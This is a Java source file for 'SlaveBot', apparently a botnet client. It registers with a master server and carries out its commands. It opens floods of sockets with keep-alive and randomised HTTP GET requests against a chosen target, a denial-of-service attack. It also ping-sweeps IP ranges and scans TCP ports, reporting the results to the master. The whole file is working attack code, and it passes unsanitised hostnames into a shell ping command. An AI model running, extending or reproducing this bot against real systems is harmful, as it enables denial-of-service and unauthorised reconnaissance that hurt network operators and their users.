import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Random;
import java.util.concurrent.TimeUnit;

public class SlaveBot {

	private static String msin = "";
	private static String[] splited;
	private static String slaveAddr;
	private static String targetAddr;
	public static List<Socket> currentconnection = Collections.synchronizedList(new ArrayList<>());
	private static Socket slave;
	private static BufferedReader in;
	private static PrintWriter out;

	public static void main(String[] args) throws Exception {
		String hostname;
		int portnumber;
		if (args.length == 0) {
			System.out.println("Please enter command");
			return;
		} else if (args[0].equals("-h") && args[2].equals("-p")) {
			hostname = args[1];
			portnumber = Integer.parseInt(args[3]);
		} else {
			System.out.println("Please enter correct command. -h IPAddress|Hostname -p port");
			return;
		}

		slave = new Socket(hostname, portnumber);
		System.out.println("client registered");

		// get message from the server
		try {
			in = new BufferedReader(new InputStreamReader(slave.getInputStream()));

			// String msin = "";
			while (!msin.equals("exit")) {
				msin = in.readLine();
				// out.println(msin);
				System.out.println("Master: " + msin);
				splited = msin.split("\\s+");

				slaveAddr = splited[1]; // Slave IP
				targetAddr = splited[2]; // Target IP

				/*
				 * System.out.println(slave.getLocalAddress().getHostAddress());
				 * System.out.println(slave.getInetAddress());
				 * System.out.println(InetAddress.getByName(slaveAddr).
				 * getHostAddress());
				 */
				// if (slaveAddr.equals("all") || slave.getInetAddress() ==
				// InetAddress.getByName(slaveAddr)) {
				if (slaveAddr.equals("all") || slave.getLocalAddress().getHostAddress()
						.equals(InetAddress.getByName(slaveAddr).getHostAddress())) {
					// System.out.println(splited[0]);
					/*
					 * int index = splited[0].indexOf('d'); if (index == -1) {
					 * index = splited[0].indexOf('c'); } if (index != -1) {
					 * splited[0] = splited[0].substring(index);
					 * //System.out.println(splited[0]); if
					 * (splited[0].equals("connect")) { // command: connect new
					 * Connect().start(); } else if
					 * (splited[0].equals("disconnect")) { // command:
					 * disconnect new Disconnect().start(); } else if
					 * (splited[0].equals("ipscan")) { // command: ipscan new
					 * ipScan().start(); } else if
					 * (splited[0].equals("tcpportscan")) { // command:
					 * tcpportscan new tcpPortScan().start(); } }
					 */
					if (msin.contains("disconnect")) {
						new Disconnect().start();
					} else if (msin.contains("connect")) {
						new Connect().start();
					} else if (msin.contains("ipscan")) {
						new ipScan().start();
					} else if (msin.contains("tcpportscan")) {
						new tcpPortScan().start();
					}
				}
			}
		} catch (Exception e) {
			slave.close();
			System.exit(-1);
			// System.out.println(e);
		}

	}

	static class Connect extends Thread {

		public void run() {

			try {
				int targetPort = Integer.parseInt(splited[3]); // Target port
				int connections = 1;
				if (splited.length >= 5) { // #connection option
					try {
						connections = Integer.parseInt(splited[4]); // splited[4] is an integer! Number of connections
					} catch (NumberFormatException e) {
						// connections = 1;
						if (!splited[4].equals("keepalive") && !splited[4].contains("url=")) {
							System.out.println("Please enter correct command.");
							System.out.println("connect IPAddressOrHostNameOfYourSlave|all TargetHostName|IPAddress "
									+ "TargetPortNumber [NumberOfConnections: 1 if not specified] [keepalive|url=path-to-be-provided-to-web-server]");
						}
					}
				}

				Socket[] sockets = new Socket[connections];
				for (int i = 0; i < connections; i++) {
					sockets[i] = new Socket(targetAddr, targetPort);

					if (msin.contains("keepalive")) { // keepalive option
						try {
							sockets[i].setKeepAlive(true);
						} catch (SocketException se) {
							System.out.println("Can't set keepalive!");
						}
						System.out.println("Set up [keepalive] connecntion!");
					}

					if (msin.contains("url")) { // url option
						// generate random string
						final String urlDict = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
						Random rnd = new Random();
						int len = rnd.nextInt(10) + 1;
						StringBuffer randomStr = new StringBuffer();
						for (int j = 0; j < len; j++) {
							randomStr.append(urlDict.charAt(rnd.nextInt(urlDict.length())));
						}
						// System.out.println("random string: " + randomStr);

						// get command input path
						String path;
						int start = msin.indexOf("url");
						int end = msin.indexOf("keepalive");
						if (end > start) {
							path = msin.substring(start + 4, end - 1);
						} else {
							path = msin.substring(start + 4);
						}
						if (!path.startsWith("/")) {
							path = "/" + path;
						}
						if (!path.contains("/#q=")) {
							path += "/#q=";
						}
						String fullUrl = "https://";
						fullUrl += targetAddr + path + randomStr;
						System.out.println("HTTP request: " + fullUrl);

						try {
							// send HTTP request to target
							PrintWriter sendToServer = new PrintWriter(sockets[i].getOutputStream(), true);
							String requestFormat = "GET " + path + randomStr + " HTTP/1.1" + "\r\n" + "Host: "
									+ targetAddr + "\r\n"; // + ":" + targetPort + "\r\n";
							if (msin.contains("keepalive")) {
								requestFormat += "Connection: keep-alive" + "\r\n\r\n";
							} else {
								requestFormat += "\r\n";
							}
							sendToServer.write(requestFormat);
							sendToServer.flush();
							// System.out.println(requestFormat);

							// get target response and clean up data
							BufferedReader serverResponse = new BufferedReader(
									new InputStreamReader(sockets[i].getInputStream()));
							String strTemp;
							// int data = 0;
							while (!(strTemp = serverResponse.readLine()).isEmpty()) {
								// System.out.println(strTemp);
								// System.out.println("clean up " + data++);
							}
							// System.out.println("complete!");
						} catch (IOException e) {
							System.out.println(e);
						}
					}

					currentconnection.add(sockets[i]);
					System.out.print("Slave " + sockets[i].getLocalAddress());
					System.out.println(" is attacking target " + targetAddr + " at port " + targetPort);
					// System.out.println(". No. of connection is " +
					// connections);
				}
			} catch (Exception e) {
				// System.out.println(e);
				System.exit(-1);
			}

		}

	}

	static class Disconnect extends Thread {

		public void run() {

			try {
				System.out.print("Slave " + slaveAddr);
				System.out.print(" stops to attack target " + targetAddr);
				if (splited.length == 4) {
					int targetPort = Integer.parseInt(splited[3]); // Target port
					List<Socket> temp = new ArrayList<Socket>();
					for (Socket s : currentconnection) {
						if (s.getInetAddress().getHostAddress().equals(
								InetAddress.getByName(targetAddr).getHostAddress()) && s.getPort() == targetPort) {
							temp.add(s);
							s.close();
						}
					}
					currentconnection.removeAll(temp);
					System.out.println(" at port " + targetPort);
				} else {
					System.out.println();
					List<Socket> temp = new ArrayList<Socket>();
					for (Socket s : currentconnection) {
						if (s.getInetAddress().getHostAddress()
								.equals(InetAddress.getByName(targetAddr).getHostAddress())) {
							temp.add(s);
							s.close();
						}
					}
					currentconnection.removeAll(temp);
				}
			} catch (Exception e) {
				// System.out.println(e);
				System.exit(-1);
			}

		}

	}

	static class ipScan extends Thread {

		public void run() {

			try {
				String sendToMaster = "";
				sendToMaster = "Slave " + slaveAddr + " reports ip address list: ";
				String start = splited[2].substring(0, splited[2].indexOf("/"));
				String ip = InetAddress.getByName(start).getHostAddress().toString();
				//System.out.println(ip);
				String range = splited[2].substring(splited[2].indexOf("/") + 1);
				// System.out.println(end);
				int count = Integer.parseInt(range);
				while (count != 0) {
					if (isReachableByPing(ip)) {
						sendToMaster += ip +",";
					}
					ip = nextIpAddress(ip);
					count--;
				}
				sendToMaster = sendToMaster.substring(0, sendToMaster.length() - 1);
				System.out.println(sendToMaster);
				out = new PrintWriter(slave.getOutputStream(), true);
				out.flush();
				out.println(sendToMaster);
			} catch (Exception e) {
				try {
					out = new PrintWriter(slave.getOutputStream(), true);
					out.flush();
					out.println("Please enter correct command. Example: ipscan all www.google.com/10");
				} catch  (IOException ioe) {
					System.out.println(ioe);
				}
				// System.out.println(e);
				// System.exit(-1);
			}

		}

	}

	static class tcpPortScan extends Thread {

		public void run() {

			try {
				String sendToMaster = "";
				sendToMaster = "Slave " + slaveAddr + " reports that target " + targetAddr + " has alive ports: ";
				String start = splited[3].substring(0, splited[3].indexOf("-"));
				// System.out.println(start);
				int ports = Integer.parseInt(start);
				String end = splited[3].substring(splited[3].indexOf("-") + 1);
				// System.out.println(end);
				int porte = Integer.parseInt(end);
				for (int p = ports; p <= porte; p++) {
					if (portIsOpen(targetAddr, p, 5000)) {
						sendToMaster += p + ",";
					}
				}
				sendToMaster = sendToMaster.substring(0, sendToMaster.length() - 1);
				System.out.println(sendToMaster);
				out = new PrintWriter(slave.getOutputStream(), true);
				out.flush();
				out.println(sendToMaster);
			} catch (Exception e) {
				try {
					out = new PrintWriter(slave.getOutputStream(), true);
					out.flush();
					out.println("Please enter correct command. Example: tcpportscan all www.google.com 80-90");
				} catch  (IOException ioe) {
					System.out.println(ioe);
				}
				// System.out.println(e);
				// System.exit(-1);
			}

		}

	}

	public static boolean isReachableByPing(String host) {
		try {
			String cmd = "";
			if (System.getProperty("os.name").startsWith("Windows")) { // For Windows
				cmd = "ping -n 4 ";
			} else { // For Linux and OSX
				cmd = "ping -c 4 ";;
			}
			cmd += host + " -w " + 5000; // deadline 5000 millisecond;
			Process myProcess = Runtime.getRuntime().exec(cmd);
			myProcess.waitFor();
			BufferedReader cmdout = new BufferedReader(new InputStreamReader(myProcess.getInputStream()));
			String temp;
			while ((temp = cmdout.readLine()) != null) {
				//System.out.println(temp);
				if (temp.contains("timed out") || temp.contains("unreachable")) {
					return false;
				}
				if (temp.contains("0% loss") || temp.contains("time")) {
					return true;
				}
			}
			if (myProcess.exitValue() == 0) {
				return true;
			} else {
				return false;
			}
		} catch (Exception e) {
			// e.printStackTrace();
			return false;
		}
	}

	public static final String nextIpAddress(final String input) {
		String result = "";
		final String[] tokens = input.split("\\.");
		if (tokens.length != 4)
			throw new IllegalArgumentException();
		for (int i = tokens.length - 1; i >= 0; i--) {
			final int item = Integer.parseInt(tokens[i]);
			if (item < 255) {
				tokens[i] = String.valueOf(item + 1);
				for (int j = i + 1; j < 4; j++) {
					tokens[j] = "0";
				}
				break;
			}
		}
		result = tokens[0] + "." + tokens[1] + "." + tokens[2] + "." + tokens[3];
		return result;
	}

	public static boolean portIsOpen(String ip, int port, int timeout) {
		try {
			Socket socket = new Socket();
			socket.connect(new InetSocketAddress(ip, port), timeout);
			socket.close();
			return true;
		} catch (Exception ex) {
			return false;
		}
	}

}
